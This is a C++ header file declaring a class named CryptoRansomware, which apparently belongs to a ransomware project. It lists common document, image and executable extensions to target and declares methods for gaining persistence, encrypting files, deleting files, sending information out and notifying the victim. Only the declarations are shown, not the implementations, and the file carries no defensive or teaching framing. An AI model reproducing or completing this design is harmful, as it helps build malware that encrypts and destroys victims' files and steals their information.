#pragma once
#include <iostream>
#include <filesystem>
#include <string>
#include <windows.h>
#include <cstdlib>
#include <iterator>
#include <fstream>
#include <vector>

#include "InfoSeeker.h"
#include "Encrypter.h"

using std::filesystem::current_path;
namespace fs = std::filesystem;
class CryptoRansomware
{
private:
	const std::vector<std::string> fileTypes{".txt",".docx",".doc",".xls",".exe",".pdf",".jpg",".jpeg",".png",".ppt"};
	std::string userHomePath;
	std::string currentPath;
	std::vector<std::filesystem::path> files{};
	InfoSeeker seeker;
	Encrypter cipher = Encrypter();
public:
	CryptoRansomware();
	void getPersistant();
	void encryptFiles();
	void deleteFiles();
	void sendInfo();
	void informUser();


};

